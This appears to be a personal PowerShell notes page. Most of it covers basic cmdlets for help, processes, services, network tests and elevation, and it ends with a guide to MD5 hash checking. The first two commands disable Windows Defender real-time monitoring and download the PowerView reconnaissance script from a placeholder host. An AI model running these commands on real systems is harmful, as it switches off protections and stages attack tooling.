### 25-Jan-24-Thu

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

```
Invoke-WebRequest http://<ip>:<port>/PowerView.ps1 -OutFile PowerView.ps1
```

```
Get-FileHash somefile.ext
```

```
Get-FileHash somfile.ext -Algorithm MD5
```

```
$psversiontable
```

![image](https://github.com/user-attachments/assets/20e96730-c065-4775-b430-3bc1c80f5979)

```
Get-Help Get-Help
```

![image](https://github.com/user-attachments/assets/7aabfd9f-168e-434d-80d5-d9ee4937fbb3)

```
Get-Help -Name Get-Command -Detailed
```

![image](https://github.com/user-attachments/assets/bba5f21b-42d0-42c2-8ae9-da9146982a39)

```
alias
```

![image](https://github.com/user-attachments/assets/64d4d22c-35ec-4ace-bae2-46925963d014)

```
Get-Process
```

```
Stop-Process -id 12345
```

```
Get-Service |Select-Object Status,Name
```

```
Get-Service | Where-Object Status -eq "Running"
```

```
Get-Service | Where-Object Status -ne "Running"
```

```
 Test-NetConnection google.com
```

![image](https://github.com/user-attachments/assets/36f3e110-51b2-4fbc-b389-3a420a4d6bc1)

```
Test-NetConnection 172.19.4.223 -Port 1514
```

<img width="361" alt="image" src="https://github.com/user-attachments/assets/5c3b31ac-e329-400a-bfa5-bf83a319f738" />

```
Start-Process -Verb RunAs -FilePath "powershell"
```

```
Start-Process -Verb RunAs -FilePath "cmd"
```

# PowerShell Command for MD5 Hash Checking of Files

Here are several ways to check MD5 hashes of files in PowerShell:

## 1. Using Get-FileHash cmdlet (PowerShell 4.0 and later)

```powershell
Get-FileHash -Algorithm MD5 -Path "C:\path\to\your\file.ext"
```

For multiple files:
```powershell
Get-FileHash -Algorithm MD5 -Path (Get-ChildItem "C:\path\to\files\*.*")
```

## 2. Comparing two files' hashes

```powershell
$hash1 = (Get-FileHash -Algorithm MD5 -Path "C:\file1.ext").Hash
$hash2 = (Get-FileHash -Algorithm MD5 -Path "C:\file2.ext").Hash
$hash1 -eq $hash2  # Returns True if hashes match
```

## 3. Verifying against a known hash

```powershell
$fileHash = (Get-FileHash -Algorithm MD5 -Path "C:\file.ext").Hash
$knownHash = "D41D8CD98F00B204E9800998ECF8427E"  # Replace with your known hash
$fileHash -eq $knownHash  # Returns True if matches
```

## 4. Creating a function for quick MD5 checking

```powershell
function Get-MD5Hash {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    Get-FileHash -Algorithm MD5 -Path $FilePath | Select-Object Algorithm, Hash, Path
}
```

Usage:
```powershell
Get-MD5Hash "C:\path\to\file.ext"
```

## Notes:
- The `Get-FileHash` cmdlet is available in PowerShell 4.0 and later
- For older PowerShell versions, you would need to use .NET methods
- MD5 is considered cryptographically broken - consider using SHA256 or SHA512 for security-sensitive applications
